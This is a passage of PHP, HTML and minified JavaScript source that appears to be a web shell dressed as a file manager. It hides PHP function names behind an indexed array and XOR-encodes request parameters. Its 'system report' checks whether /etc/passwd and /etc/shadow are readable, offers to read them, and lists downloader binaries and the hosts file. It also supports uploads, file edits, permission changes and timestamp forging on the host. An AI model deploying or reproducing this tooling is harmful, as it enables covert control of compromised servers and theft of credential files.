<button type="button" class="fm-pg-btn fm-pg-arrow" onclick="sb('l',{pg:<?php echo (int)($pg-1); ?>})" title="Previous page" aria-label="Previous page" <?php echo $pg<=1?'disabled':''; ?>><i class="ph-bold ph-caret-left"></i></button>
<div class="fm-pg-nums">
<?php foreach($page_list as $pn): ?>
<?php if($pn==='...'): ?><span class="fm-pg-gap" aria-hidden="true">...</span>
<?php elseif((int)$pn===(int)$pg): ?><span class="fm-pg-btn fm-pg-num is-current" aria-current="page"><?php echo (int)$pn; ?></span>
<?php else: ?><button type="button" class="fm-pg-btn fm-pg-num" onclick="sb('l',{pg:<?php echo (int)$pn; ?>})" aria-label="Page <?php echo (int)$pn; ?>"><?php echo (int)$pn; ?></button>
<?php endif; ?>
<?php endforeach; ?>
</div>
<button type="button" class="fm-pg-btn fm-pg-arrow" onclick="sb('l',{pg:<?php echo (int)($pg+1); ?>})" title="Next page" aria-label="Next page" <?php echo $pg>=$pages?'disabled':''; ?>><i class="ph-bold ph-caret-right"></i></button>
</div>
<form method="post" action="<?php echo fh($sp1); ?>" class="fm-pg-jump">
<input type="hidden" name="x" value="<?php echo fh($b3); ?>">
<input type="hidden" name="y" value="l">
<input type="hidden" name="q" value="<?php echo fh($q); ?>">
<input type="number" name="pg" value="<?php echo (int)$pg; ?>" min="1" max="<?php echo (int)$pages; ?>" inputmode="numeric" aria-label="Go to page" title="Type a page number and press Enter">
<span class="fm-pg-of">/ <?php echo (int)$pages; ?></span>
<button type="submit" class="fm-pg-go">Go</button>
</form>
<?php endif; ?>
</div>
</div>
</div>
<?php endif; ?>
</div>

<div id="bb" class="fixed bottom-6 left-1/2 -translate-x-1/2 sm:left-auto sm:right-8 sm:translate-x-0 bg-zinc-900/95 backdrop-blur-md border border-zinc-700/50 p-2 sm:p-2.5 rounded-2xl sm:rounded-lg shadow-2xl flex items-center gap-1 sm:gap-3 transition-all duration-400 ease-[cubic-bezier(0.16,1,0.3,1)] transform translate-y-12 opacity-0 scale-95 pointer-events-none z-40">
<span id="sc" class="px-2 sm:px-0 text-[11px] sm:text-xs font-bold text-zinc-400 whitespace-nowrap">0 Selected</span>
<div class="h-5 sm:h-4 w-px bg-zinc-700 mx-1 sm:mx-0"></div>
<button onclick="cbSet('c')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-blue-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Copy">
<i class="ph-bold ph-copy text-sm"></i><span class="text-xs hidden sm:inline">Copy</span>
</button>
<button onclick="cbSet('m')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-yellow-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Cut">
<i class="ph-bold ph-scissors text-sm"></i><span class="text-xs hidden sm:inline">Cut</span>
</button>
<button onclick="ba('z')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-green-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Compress">
<i class="ph-bold ph-file-archive text-sm"></i><span class="text-xs hidden sm:inline">Compress</span>
</button>
<div class="h-5 sm:h-4 w-px bg-zinc-700 mx-1 sm:mx-0"></div>
<button onclick="ba('d')" class="h-9 w-9 sm:h-auto sm:w-auto flex items-center justify-center sm:gap-1.5 rounded-xl sm:rounded-none text-zinc-300 hover:text-red-400 hover:bg-zinc-800 sm:hover:bg-transparent transition-colors font-medium active:scale-95 sm:active:scale-100" title="Delete">
<i class="ph-bold ph-trash text-sm"></i><span class="text-xs hidden sm:inline">Delete</span>
</button>
</div>

<?php if($m && !$ed): ?>
<div id="toast" class="msg <?php echo (strpos($m,'failed')!==false||strpos($m,'not found')!==false||strpos($m,'denied')!==false||strpos($m,'Cannot')!==false)?'err':'ok'; ?>">
    <span><?php echo fh($m); ?></span>
</div>
<?php endif; ?>

<div id="up-panel" class="up-panel hidden" role="status" aria-live="polite">
<div class="up-head">
<span class="up-dot"></span>
<span class="up-label" id="up-label">Uploading</span>
<span class="up-name" id="up-name"></span>
<span class="up-pct" id="up-pct">0%</span>
<button type="button" class="up-x" id="up-x" title="Hide"><i class="ph-bold ph-x"></i></button>
</div>
<div class="up-track"><div class="up-fill" id="up-fill"></div></div>
<div class="up-detail" id="up-detail"></div>
</div>

<div id="md" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="New directory">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('md')"></div>
<form class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm" onsubmit="sb('k',{n:document.getElementById('nd').value});return false;" autocomplete="off">
<h3 class="text-sm font-bold text-zinc-900 mb-1">New Directory</h3>
<input type="text" id="nd" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none" placeholder="folder-name">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('md')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button type="submit" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Create</button>
</div>
</form>
</div>

<div id="mf" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="New file">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mf')"></div>
<form class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm" onsubmit="sb('f',{n:document.getElementById('nf').value});return false;" autocomplete="off">
<h3 class="text-sm font-bold text-zinc-900 mb-1">New File</h3>
<input type="text" id="nf" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none" placeholder="file.txt">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mf')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button type="submit" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Create</button>
</div>
</form>
</div>

<div id="mr" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="Rename">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mr')"></div>
<form class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm" onsubmit="sb('n',{o:document.getElementById('ro').value,n:document.getElementById('rn').value});return false;" autocomplete="off">
<h3 class="text-sm font-bold text-zinc-900 mb-4">Rename</h3>
<input type="hidden" id="ro"><input type="text" id="rn" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mr')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button type="submit" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Save</button>
</div>
</form>
</div>

<div id="mc" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="Permissions">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mc')"></div>
<form class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm" onsubmit="sb('h',{w:document.getElementById('ct').value,r:document.getElementById('cp').value});return false;" autocomplete="off">
<h3 class="text-sm font-bold text-zinc-900 mb-1">Permissions</h3>
<p class="text-[10px] text-zinc-500 mb-3 font-mono">Press Enter to update</p>
<input type="hidden" id="ct"><input type="text" id="cp" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 font-mono focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none" placeholder="0644" maxlength="4" inputmode="numeric" pattern="[0-7]{1,4}">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mc')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button type="submit" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Update</button>
</div>
</form>
</div>

<div id="mt" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="Edit date">
<div class="absolute inset-0 bg-white/60 backdrop-blur-sm" onclick="cm('mt')"></div>
<form class="relative bg-white rounded-lg shadow-2xl ring-1 ring-zinc-900/5 p-5 w-full max-w-sm" onsubmit="sb('t',{w:document.getElementById('tn').value,d:document.getElementById('td').value});return false;" autocomplete="off">
<h3 class="text-sm font-bold text-zinc-900 mb-1">Edit Date</h3>
<p class="text-[10px] text-zinc-500 mb-3 font-mono">Press Enter to update</p>
<input type="hidden" id="tn"><input type="text" id="td" class="w-full bg-zinc-50 border border-zinc-200 rounded-md px-3 py-2 text-xs mb-4 font-mono focus:ring-1 focus:ring-zinc-900 focus:bg-white focus:border-zinc-900 transition-all outline-none" placeholder="YYYY-MM-DD HH:MM:SS">
<div class="flex justify-end gap-2">
<button type="button" onclick="cm('mt')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-100 text-xs font-medium">Cancel</button>
<button type="submit" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Update</button>
</div>
</form>
</div>

<?php
$apache_mods=function_exists($a2[50])?@$a2[50]():array();
$apache_text=is_array($apache_mods)&&!empty($apache_mods)?implode(', ',array_slice($apache_mods,0,10)).(count($apache_mods)>10?' ...':''):'not available';
$curl_supp=function_exists($a2[51])?'enabled':'disabled';
$db_supp=array();
if(function_exists($a2[52]))$db_supp[]='MySQLi';
if(function_exists($a2[53]))$db_supp[]='PostgreSQL';
if(class_exists('PDO'))$db_supp[]='PDO';
$dbs=!empty($db_supp)?implode(', ',$db_supp):'none';
$passwd_ok=@$a2[46]($a2[58]);
$shadow_ok=@$a2[46]($a2[59]);
$passwd_v=$passwd_ok?'<span class="term-warn">readable</span><button type="button" class="term-link" onclick="cm(\'m-info\');v('.fm_js($a2[58]).')">read</button>':'<span class="term-dim">protected</span>';
$shadow_v=$shadow_ok?'<span class="term-bad">readable</span><button type="button" class="term-link" onclick="cm(\'m-info\');v('.fm_js($a2[59]).')">read</button>':'<span class="term-dim">protected</span>';
$distr_name='Windows';
if(!$is_win){
    $osr=@$a2[8]($a2[60]);
    $distr_name=($osr!==false&&preg_match('/PRETTY_NAME="([^"]+)"/',$osr,$mm))?$mm[1]:'Linux';
}
$found_useful=array();
$found_dl=array();
if(!$is_win){
    $bin_paths=explode(',',$a2[65]);
    foreach(explode(',',$a2[63]) as $b){foreach($bin_paths as $bp){if(@$a2[6]($bp.$b)){$found_useful[]=$b;break;}}}
    foreach(explode(',',$a2[64]) as $b){foreach($bin_paths as $bp){if(@$a2[6]($bp.$b)){$found_dl[]=$b;break;}}}
}
$hdd_mounts=array();
if(!$is_win){
    $hdd_seen=array();
    foreach(array('/','/home','/tmp','/var','/boot') as $hp){
        if(@$a2[7]($hp)){
            $ht=@$a2[38]($hp);$hf=@$a2[39]($hp);
            if($ht>0){
                $hk=$ht.'_'.$hf;
                if(!isset($hdd_seen[$hk])){
                    $hdd_seen[$hk]=1;
                    $hdd_mounts[]=array('p'=>$hp,'t'=>fs($ht),'f'=>fs($hf),'pct'=>$ht>0?round(($ht-$hf)/$ht*100):0);
                }
            }
        }
    }
}else{
    foreach(range('C','Z') as $dl){
        $dr=$dl.':';
        if(@$a2[7]($dr.'\\')){
            $ht=@$a2[38]($dr);$hf=@$a2[39]($dr);
            if($ht>0)$hdd_mounts[]=array('p'=>$dr,'t'=>fs($ht),'f'=>fs($hf),'pct'=>round(($ht-$hf)/$ht*100));
        }
    }
}
$hosts_file='';
if(!$is_win&&@$a2[46]($a2[61]))$hosts_file=@$a2[8]($a2[61]);
elseif($is_win&&@$a2[46]($a2[62]))$hosts_file=@$a2[8]($a2[62]);
if(!is_string($hosts_file))$hosts_file='';
$uid_info='unknown';
if(function_exists($a2[40])){$teuid=@$a2[42]();$tpw=@$a2[40]($teuid);$uid_info=(is_array($tpw)&&isset($tpw['name']))?$tpw['name'].' ( '.$teuid.' )':(string)$teuid;}
$gid_info='unknown';
if(function_exists($a2[41])){$tegid=@$a2[43]();$tpg=@$a2[41]($tegid);$gid_info=(is_array($tpg)&&isset($tpg['name']))?$tpg['name'].' ( '.$tegid.' )':(string)$tegid;}
if($is_win){$uid_info=$a2[44]();$gid_info='Windows Group';}
$prompt_user=preg_replace('/\s*\(.*$/','',$uid_info);
if($prompt_user==='')$prompt_user='user';
$php_version=$a2[45]();
$safe_mode=$a2[57]('safe_mode')?'ON':'OFF';
$sapi=function_exists('php_sapi_name')?@php_sapi_name():'cli';
$dt=$a2[55]('Y-m-d H:i:s');
$ds_tot=@$a2[38]($b1);$ds_fre=@$a2[39]($b1);
$ds_perc=$ds_tot>0?round(($ds_tot-$ds_fre)/$ds_tot*100):0;
$host_name=function_exists('gethostname')?@gethostname():@$a2[23]('n');
if(!is_string($host_name)||$host_name==='')$host_name='localhost';
$load=false;
if(function_exists('sys_getloadavg'))$load=@sys_getloadavg();
$mem_usage=function_exists('memory_get_usage')?@memory_get_usage(true):0;
$mem_peak=function_exists('memory_get_peak_usage')?@memory_get_peak_usage(true):0;
$uptime_text='-';
if(!$is_win&&@$a2[46]('/proc/uptime')){
    $up_raw=@$a2[8]('/proc/uptime');
    if($up_raw!==false&&$up_raw!==''){
        $up_sec=(int)floatval($up_raw);
        $up_d=(int)floor($up_sec/86400);
        $up_h=(int)floor(($up_sec%86400)/3600);
        $up_m=(int)floor(($up_sec%3600)/60);
        $uptime_text=$up_d.'d '.$up_h.'h '.$up_m.'m';
    }
}
$df_lines=array();
$df_lines[]=str_pad('FILESYSTEM',11).str_pad('USE',19, ' ', STR_PAD_LEFT).'  '.str_pad('FREE',10).str_pad('SIZE',10);
foreach($hdd_mounts as $hm){
    $df_lines[]=str_pad($hm['p'],11).'['.fm_bar($hm['pct']).'] '.str_pad($hm['pct'].'%',4,' ',STR_PAD_LEFT).'  '.str_pad($hm['f'],10).str_pad($hm['t'],10);
}
$df_text=implode("\n",$df_lines);
?>

<div id="m-info" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label="System information">
<div class="absolute inset-0 term-backdrop" onclick="cm('m-info')"></div>
<div class="term-window">
<div class="term-chrome">
<div class="term-lights"><i></i><i></i><i></i></div>
<div class="term-title"><?php echo fh($prompt_user); ?>@<?php echo fh($host_name); ?>: ~</div>
<button type="button" class="term-close" onclick="cm('m-info')" aria-label="Close"><i class="ph-bold ph-x"></i></button>
</div>
<div class="term-body">
<div class="term-banner">FM system report <?php echo fh($dt); ?> | <?php echo fh($distr_name); ?></div>

<div class="term-section">
<div class="term-sec-head"><span class="term-sec-num">[01]</span> system</div>
<?php
fm_term_row('host',fh($host_name));
fm_term_row('os',fh($distr_name));
fm_term_row('kernel',fh($uname_display!==''?$uname_display:'unknown'));
fm_term_row('uptime',fh($uptime_text));
fm_term_row('datetime',fh($dt));
fm_term_row('load avg',fh($load?(number_format($load[0],2).'  '.number_format($load[1],2).'  '.number_format($load[2],2)):'n/a'));
?>
</div>

<div class="term-section">
<div class="term-sec-head"><span class="term-sec-num">[02]</span> php &amp; web</div>
<?php
fm_term_row('php',fh($php_version).' <span class="term-dim">('.fh($sapi).')</span>');
fm_term_row('web server',fh($software!==''?$software:'unknown'));
fm_term_row('safe mode',fh($safe_mode));
fm_term_row('curl',($curl_supp==='enabled'?'<span class="term-ok">enabled</span>':'<span class="term-bad">disabled</span>'));
fm_term_row('databases',fh($dbs));
fm_term_row('memory',fh(fs($mem_usage)).' <span class="term-dim">peak '.fh(fs($mem_peak)).'</span>');
fm_term_row('modules',fh($apache_text));
?>
<div class="term-row"><span class="term-k">disabled fns</span><span class="term-v left"><?php echo empty($df_items)?'<span class="term-dim">none</span>':'<span class="term-bad">'.fh(implode(', ',$df_items)).'</span>'; ?></span></div>
</div>

<div class="term-section">
<div class="term-sec-head"><span class="term-sec-num">[03]</span> security</div>
<?php
fm_term_row('user',fh($uid_info));
fm_term_row('group',fh($gid_info));
echo '<div class="term-row"><span class="term-k">passwd</span><span class="term-v">'.$passwd_v.'</span></div>';
echo '<div class="term-row"><span class="term-k">shadow</span><span class="term-v">'.$shadow_v.'</span></div>';
?>
</div>

<div class="term-section">
<div class="term-sec-head"><span class="term-sec-num">[04]</span> storage</div>
<div class="term-row"><span class="term-k">cwd usage</span><span class="term-v"><span class="term-bar <?php echo $ds_perc>=90?'bad':($ds_perc>=75?'warn':''); ?>">[<?php echo fm_bar($ds_perc); ?>]</span> <?php echo (int)$ds_perc; ?>% <span class="term-dim"><?php echo fh(fs($ds_fre)); ?> free of <?php echo fh(fs($ds_tot)); ?></span></span></div>
<div class="term-row"><span class="term-k">cwd</span><span class="term-v left"><?php echo fh($b1); ?></span></div>
<pre class="term-pre term-df"><?php echo $df_text!==''?fh($df_text):'no disk information available'; ?></pre>
</div>

<div class="term-section">
<div class="term-sec-head"><span class="term-sec-num">[05]</span> network &amp; hosts</div>
<?php
fm_term_row('binaries',fh(!empty($found_useful)?implode(', ',$found_useful):'none'));
fm_term_row('downloaders',fh(!empty($found_dl)?implode(', ',$found_dl):'none'));
?>
<pre class="term-pre"><?php echo $hosts_file!==''?fh($hosts_file):'hosts file not readable'; ?></pre>
</div>

</div>
<div class="term-footer">
<span class="term-hint">Esc closes this session</span>
<button type="button" class="term-footer-btn" onclick="cm('m-info')">close</button>
</div>
</div>
</div>

</div>
<script>
!function(e,t){var n=e.fmConfig||{},a=e.location.pathname.replace(/\/\/+/g,"/")+e.location.search,o=n.xorKey||"fm_xor_key",r=null,i=null;function s(e,n,a){var o=t.createElement("input");o.type="hidden",o.name=n,o.value=a,e.appendChild(o)}function l(){i&&(clearTimeout(i),i=null);var e=t.createElement("form");return e.method="post",e.action=a,e}function c(){t.cookie="fc=;Max-Age=0;path=/;SameSite=Lax",t.cookie="fa=;Max-Age=0;path=/;SameSite=Lax"}function d(e){var t=a,n=t.indexOf("#");n>=0&&(t=t.substring(0,n));var o=[];for(var r in e)Object.prototype.hasOwnProperty.call(e,r)&&null!==e[r]&&void 0!==e[r]&&o.push(encodeURIComponent(r)+"="+encodeURIComponent(e[r]));return o.length?t+(t.indexOf("?")>=0?"&":"?")+o.join("&"):t}function u(e){try{return JSON.parse(e)}catch(e){return null}}function m(){return t.getElementById("up-panel")}function f(){r&&(clearTimeout(r),r=null);var e=m();e&&e.classList.add("hidden")}function p(e,n){if(m()){e=Math.max(0,Math.min(100,e));var a=t.getElementById("up-fill"),o=t.getElementById("up-pct"),r=t.getElementById("up-label");a&&(a.style.width=e+"%"),o&&(o.textContent=Math.round(e)+"%"),r&&n&&(r.textContent=n)}}function g(n,a){e.__fmUploading=!1;var o=m();if(n)return o&&o.classList.add("ok"),p(100,"Uploaded"),i&&clearTimeout(i),void(i=setTimeout(function(){f(),e.sb("l",{pg:1})},3200));o&&o.classList.add("err"),p(0,"Upload failed");var s=t.getElementById("up-detail");s&&(s.textContent=a||"All upload methods failed"),r=setTimeout(f,12e3)}function v(e,t,n,a){e.upload.onprogress=function(e){e.lengthComputable&&e.total>0&&p(t+e.loaded/e.total*n,"Uploading")}}function h(t,a){var o=new e.XMLHttpRequest;o.open("POST",d({z:"ub",x:n.cwdEncoded||"",name:t.name}),!0),o.setRequestHeader("Content-Type","application/octet-stream"),o.setRequestHeader("X-Requested-With","XMLHttpRequest"),o.setRequestHeader("Accept","application/json"),v(o,0,84),o.onload=function(){var e=u(o.responseText||"");o.status>=200&&o.status<300&&e&&e.ok?a(!0,e.message||""):a(!1,e&&e.message?e.message:"Raw upload rejected")},o.onerror=function(){a(!1,"Network error during raw upload")},o.send(t)}function b(t,a){for(var o=parseInt(n.chunkSize,10)||524288,r=Math.max(1,Math.ceil(t.size/o)),i="",s="abcdef0123456789",l=0;l<32;l++)i+=s.charAt(Math.floor(16*Math.random()));function c(e){a(!1,e||"Chunked upload failed")}p(0,"Uploading"),function s(l,m){if(l>=r)!function(){p(95,"Assembling");var o=new e.XMLHttpRequest;o.open("POST",d({z:"uj",x:n.cwdEncoded||"",token:i,n:r,name:t.name,size:t.size}),!0),o.setRequestHeader("X-Requested-With","XMLHttpRequest"),o.setRequestHeader("Accept","application/json"),o.onload=function(){var e=u(o.responseText||"");o.status>=200&&o.status<300&&e&&e.ok?a(!0,e.message||""):c(e&&e.message?e.message:"Chunk merge failed")},o.onerror=function(){c("Network error during chunk merge")},o.send("")}();else{var f=l*o,g=Math.min(f+o,t.size),v=t.slice(f,g),h=new e.XMLHttpRequest;h.open("POST",d({z:"cu",x:n.cwdEncoded||"",token:i,i:l,n:r,name:t.name}),!0),h.setRequestHeader("Content-Type","application/octet-stream"),h.setRequestHeader("X-Requested-With","XMLHttpRequest"),h.setRequestHeader("Accept","application/json"),h.upload.onprogress=function(e){var t=e.lengthComputable&&e.total>0?e.loaded/e.total:0;p((l+t)/r*92,"Uploading")},h.onload=function(){var e=u(h.responseText||"");h.status>=200&&h.status<300&&e&&e.ok?s(l+1,0):m<1?setTimeout(function(){s(l,m+1)},350):c(e&&e.message?e.message:"Chunk "+(l+1)+" rejected")},h.onerror=function(){m<1?setTimeout(function(){s(l,m+1)},350):c("Network error on chunk "+(l+1))},h.send(v)}}(0,0)}function y(){var e=t.querySelector(".fm-crumbs");if(e){var n=Array.prototype.slice.call(e.querySelectorAll(".fm-crumb-unit")),a=e.querySelector(".fm-crumb-gap");n.length&&a&&(o(),r()&&(s(2,2)||s(1,1)||(i(1,1),n[n.length-1].classList.add("fm-crumb-shrink"))))}function o(){for(var e=0;e<n.length;e++)n[e].classList.remove("hidden"),n[e].classList.remove("fm-crumb-shrink");a.classList.add("hidden")}function r(){return e.scrollWidth>e.clientWidth+1}function i(t,r){o();var i=n.length;if(!(i<3)){t=Math.min(t,i-1);var s=i-(r=Math.min(r,i-t));if(!(s<=t)){for(var l=t;l<s;l++)n[l].classList.add("hidden");a.classList.remove("hidden"),e.insertBefore(a,n[s])}}}function s(e,t){var a=n.length;if(a<=e+t)return!1;for(var o=1;o<=a-e-t;o++)for(var s=e;s<=a-o-t;s++){var l=a-o-s;if(!(l<t)&&(i(s,l),!r()))return!0}return!1}}e.SELF=a,e.K=o,e.en=function(e){for(var t=function(e){for(var t="",n=0;n<e.length;n++){var a=e.charCodeAt(n);if(a<128)t+=String.fromCharCode(a);else if(a<2048)t+=String.fromCharCode(192|a>>6,128|63&a);else if(a>=55296&&a<=56319&&n+1<e.length){var o=65536+(a-55296<<10)+(e.charCodeAt(++n)-56320);t+=String.fromCharCode(240|o>>18,128|o>>12&63,128|o>>6&63,128|63&o)}else t+=String.fromCharCode(224|a>>12,128|a>>6&63,128|63&a)}return t}(String(e)),n="",a=0;a<t.length;a++)n+=String.fromCharCode(t.charCodeAt(a)^o.charCodeAt(a%o.length));for(var r="",i=0;i<n.length;i++){var s=n.charCodeAt(i).toString(16);s.length<2&&(s="0"+s),r+=s}return r},e.jt=function(e,n){for(var a=t.querySelectorAll(".msg"),o=0;o<a.length;o++)a[o].remove();var r=t.createElement("div");r.className="msg "+(!1===n?"err":"ok");var i=t.createElement("span");i.textContent=String(e),r.appendChild(i),t.body.appendChild(r),setTimeout(function(){r.classList.add("out"),setTimeout(function(){r.remove()},350)},3200)},e.pf=function(n){var a=l();s(a,"x",e.en(n)),s(a,"q",""),t.body.appendChild(a),a.submit()},e.g=function(t){e.pf(t)},e.v=function(a){var o=l();s(o,"x",n.cwdEncoded||""),s(o,"y","v"),s(o,"w",e.en(a)),t.body.appendChild(o),o.submit()},e.dl=function(e){var a=l();s(a,"x",n.cwdEncoded||""),s(a,"y","l"),s(a,"z","d"),s(a,"w",e),t.body.appendChild(a),a.submit()},e.cl=function(){c(),e.localStorage.removeItem("fi"),e.localStorage.removeItem("gi"),e.g(n.currentPath||"")},e.hm=function(){c(),e.localStorage.removeItem("fi"),e.localStorage.removeItem("gi"),e.g(n.homePath||"")},e.md=function(e){var n=t.getElementById(e);if(n){n.classList.remove("hidden");var a=n.querySelector("input[type=text],input[type=number],textarea");a&&setTimeout(function(){try{a.focus(),a.select&&a.select()}catch(e){}},30)}},e.cm=function(e){var n=t.getElementById(e);n&&n.classList.add("hidden")},e.pr=function(n){t.getElementById("ro").value=n,t.getElementById("rn").value=n,e.md("mr")},e.pd=function(t){e.confirm("Delete "+t+"?")&&e.sb("e",{w:t})},e.ph=function(n,a){t.getElementById("ct").value=n,t.getElementById("cp").value=a,e.md("mc")},e.pt=function(n,a){t.getElementById("tn").value=n,t.getElementById("td").value=a,e.md("mt")},e.sb=function(e,a){var o=l();if(s(o,"y","l"),s(o,"x",n.cwdEncoded||""),s(o,"q",a&&Object.prototype.hasOwnProperty.call(a,"q")?a.q:n.query||""),s(o,"z",e),a)for(var r in a)Object.prototype.hasOwnProperty.call(a,r)&&"q"!==r&&s(o,r,a[r]);t.body.appendChild(o),o.submit()},e.sc=function(){e.sb("l",{q:"",pg:1})},e.sf=function(){var a=t.getElementById("edc").value,o=t.getElementById("edp").value,r=l();s(r,"y","v"),s(r,"x",n.cwdEncoded||""),s(r,"z","s"),s(r,"w",e.en(o)),s(r,"b6","1");var i,c=t.createElement("textarea");c.style.display="none",c.name=n.editorContentFieldName||"",c.value=(i=a,e.btoa(e.unescape(e.encodeURIComponent(String(i))))),r.appendChild(c),s(r,n.editorPathFieldName||"",e.en(o)),t.body.appendChild(r),r.submit()},e.fr_save=function(){var n=t.getElementById("fi"),a=t.getElementById("gi");n&&a&&(e.localStorage.setItem("fi",n.value),e.localStorage.setItem("gi",a.value))},e.ts=function(n){for(var a=t.querySelectorAll('input[name="i[]"]'),o=0;o<a.length;o++)a[o].checked=n.checked;e.bu()},e.bu=function(){var e=t.querySelectorAll('input[name="i[]"]:checked').length,n=t.getElementById("bb"),a=t.getElementById("sc");n&&a&&(e>0?(n.classList.remove("translate-y-12","opacity-0","scale-95","pointer-events-none"),n.classList.add("translate-y-0","opacity-100","scale-100"),a.innerText=e+" Selected"):(n.classList.remove("translate-y-0","opacity-100","scale-100"),n.classList.add("translate-y-12","opacity-0","scale-95","pointer-events-none")))},e.gs=function(){for(var e=t.querySelectorAll('input[name="i[]"]:checked'),n=[],a=0;a<e.length;a++)n.push(e[a].value);return n},e.ba=function(t){var n=e.gs();0!==n.length&&("d"===t?e.confirm("Delete "+n.length+" items?")&&e.sb("m",{s:n.join("||")}):"z"===t&&e.sb("cz",{s:n.join("||")}))},e.cbSet=function(a){var o=e.gs();if(0!==o.length){e.localStorage.setItem("cb_i",o.join("||")),e.localStorage.setItem("cb_d",n.cwdEncoded||""),e.localStorage.setItem("cb_o",a),e.cbUp();for(var r=t.querySelectorAll('input[name="i[]"]'),i=0;i<r.length;i++)r[i].checked=!1;var s=t.querySelector('thead input[type="checkbox"]');s&&(s.checked=!1),e.bu(),e.jt(("m"===a?"Cut ":"Copied ")+o.length+" item"+(1!==o.length?"s":""))}},e.cbClr=function(){e.localStorage.removeItem("cb_i"),e.localStorage.removeItem("cb_d"),e.localStorage.removeItem("cb_o"),e.cbUp()},e.cbPa=function(){var a=e.localStorage.getItem("cb_i"),o=e.localStorage.getItem("cb_d"),r=e.localStorage.getItem("cb_o");if(a&&o){var i=l();s(i,"x",n.cwdEncoded||""),s(i,"y","l"),s(i,"z","m"===r?"mv":"cp"),s(i,"s",a),s(i,"sd",o),t.body.appendChild(i),e.cbClr(),i.submit()}},e.cbUp=function(){var n=t.getElementById("pb");if(n){var a=e.localStorage.getItem("cb_i"),o=e.localStorage.getItem("cb_o");if(a){var r=a.split("||").length;t.getElementById("pbt").innerText=("m"===o?"Cut ":"Copied ")+r+" item"+(1!==r?"s":"")+" - paste here",n.classList.remove("hidden")}else n.classList.add("hidden")}},e.setMode=function(e){var n=t.getElementById("edc"),a=t.getElementById("edv"),o=t.getElementById("btn-mode-view"),r=t.getElementById("btn-mode-edit"),i=t.getElementById("btn-save");if(n&&a&&o&&r&&i){if("view"===e)return n.classList.add("hidden"),a.classList.remove("hidden"),o.classList.add("bg-white","shadow-sm","text-zinc-900"),o.classList.remove("text-zinc-500"),r.classList.remove("bg-white","shadow-sm","text-zinc-900"),r.classList.add("text-zinc-500"),i.classList.add("opacity-50","pointer-events-none"),void(a.innerText=n.value);a.classList.add("hidden"),n.classList.remove("hidden"),r.classList.add("bg-white","shadow-sm","text-zinc-900"),r.classList.remove("text-zinc-500"),o.classList.remove("bg-white","shadow-sm","text-zinc-900"),o.classList.add("text-zinc-500"),i.classList.remove("opacity-50","pointer-events-none")}},function(){function e(e){for(var t=2533344,n=e.length,a=[],o=0;o<n;o++)a[o]=e.charAt(o);for(o=0;o<n;o++){var 